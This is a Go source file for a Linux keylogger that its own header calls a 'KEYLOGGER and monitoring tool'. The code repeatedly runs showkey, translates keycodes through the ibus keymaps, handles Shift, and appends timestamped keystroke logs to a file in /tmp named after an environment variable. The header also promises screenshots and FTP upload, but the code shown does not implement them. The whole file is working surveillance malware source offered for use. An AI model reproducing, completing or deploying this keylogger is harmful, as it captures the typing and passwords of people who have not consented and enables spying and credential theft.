/*
KEYLOGGER and monitoring tool.

This program is intended to log all key strokes and also periodically capture the screenshots of the screen
These will then be uploaded to an FTP server all files will be named based on the ENV variable called ENAME

*/
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

// KEYMAP is going to save the key board layout in it
var KEYMAP map[string]string

func main() {
	if len(KEYMAP) == 0 {
		getKeyBoardCodes()
	}
	keyLoggingDone := make(chan bool, 1)
	rawKeys := make(chan string, 1)

logger:
	go logKeys(keyLoggingDone, rawKeys)
	if <-keyLoggingDone == true {
		output := <-rawKeys
		go parse(output)
		goto logger
	}
}

// First configure the command
// here we are using showkey to get a list of all keys that have been typed. This will stop automatically
// after 10s of last keystrok so we have to keep restarting this every time this is done.
func logKeys(done chan bool, output chan string) {
	// fmt.Println("Started Logging")
	KeyCommand := exec.Command("bash", "-c", "showkey")
	KeyboardOutPut, _ := KeyCommand.StdoutPipe()
	KeyCommand.Start()
	grepBytes, _ := ioutil.ReadAll(KeyboardOutPut)
	KeyCommand.Wait()
	done <- true
	output <- string(grepBytes)
}

// Parse is going to convert the raw bytestream of keycodes into a human readable format.
func parse(ipstring string) {
	FirstLevelFilter := map[string]string{
		"Shift_R":      "<SHIFT>",
		"Shift_L":      "<SHIFT>",
		"Control_L":    "<CTRL>",
		"Control_R":    "<CTRL>",
		"BackSpace":    "<BS>",
		"Tab":          "<TAB>",
		"space":        " ",
		"period":       ".",
		"comma":        ",",
		"slash":        "/",
		"Alt_L":        "<ALT>",
		"Alt_R":        "<ALT>",
		"minus":        "-",
		"equal":        "=",
		"backslash":    "\\",
		"apostrophe":   "'",
		"semicolon":    ";",
		"grave":        "`",
		"bracketleft":  "[",
		"bracketright": "]",
		"Return":       "\n",
		"Caps_Lock":    "<CAPS>",
		"Escape":       "<ESC>",
		"Right":        "<RIGHT>",
		"Left":         "<LEFT>",
		"Down":         "<Down>",
		"Up":           "<UP>",
	}

	parse1 := strings.Replace(ipstring, `press any key (program terminates 10s after last keypress)...`, "", -1)
	parsed := strings.Replace(parse1, `keycode`, "", -1)
	parsedArray := strings.Split(parsed, "\n")
	rawLog := ""

	for _, v := range parsedArray {
		// KEY release also becomes very important to note incase of SHIFT key. As This will only track the first occurance of it.
		// Thus not allowing a good picture of what is actually happening.
		if strings.Contains(v, "press") {
			value := strings.Replace(v, "press", "", 1)
			formattedValue := strings.Replace(value, " ", "", -1)
			key := KEYMAP[formattedValue]
			if value, ok := FirstLevelFilter[key]; ok {
				rawLog += value
			} else {
				rawLog += key
			}
		}
	}

	//TODO also build a second level or parser that takes into account SHIFT and does the corresponding replace.
	parseShifts(rawLog)
}

func parseShifts(s string) {
	var re = regexp.MustCompile(`<SHIFT>\w`)
	var pairs []string
	for _, match := range re.FindAllString(s, -1) {
		arr := strings.Split(match, "<SHIFT>")
		pairs = append(pairs, match)
		pairs = append(pairs, strings.ToUpper(arr[1]))
	}
	// Create replacer with pairs as arguments.
	r := strings.NewReplacer(pairs...)
	str := r.Replace(s)

	//This still has a lot of work to be done. But for now this looks good. Will come back to this in sometime.
	logResults(str)
}

func logResults(str string) {
	// Only log if string is present that is it actually has a keyevent captured.
	if str != "" {
		ename := os.Getenv("ENAME")
		filename := "/tmp/" + ename + "_keys.log"
		f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, 0600)

		t := time.Now()
		text := t.Format(time.RFC3339)
		text += "\n\n"
		text += str
		text += "\n"
		if err != nil {
			panic(err)
		}

		defer f.Close()

		if _, err = f.WriteString(text); err != nil {
			panic(err)
		}
	}
}

func getKeyBoardCodes() {
	KeyLayoutCommand := exec.Command("ls", "/usr/share/ibus/keymaps")
	Output, _ := KeyLayoutCommand.Output()
	var keys string
	keyMap := map[string]string{}

	for _, file := range strings.Split(string(Output), "\n") {
		filename := "/usr/share/ibus/keymaps/" + file
		output, _ := exec.Command("cat", filename).Output()
		keys = keys + string(output)
		keys = keys + "\n"
	}
	formattedKeys := strings.Replace(keys, "keycode ", "", -1)
	formattedKeys1 := strings.Replace(formattedKeys, "addupper", "", -1)
	formattedKeys2 := strings.Replace(formattedKeys1, "  ", "", -1)

	var re = regexp.MustCompile(`(\w*).\d*.=.\w*`)
	for _, match := range re.FindAllString(formattedKeys2, -1) {
		array := strings.Split(match, " = ")
		keyMap[array[0]] = array[1]
	}
	//TODO format baseLayout's shift and alt functions
	KEYMAP = keyMap
}

func formatMapAndPrint(ma interface{}) {
	b, err := json.MarshalIndent(ma, "", "  ")
	if err != nil {
		fmt.Println("error:", err)
	}
	fmt.Print(string(b))
}
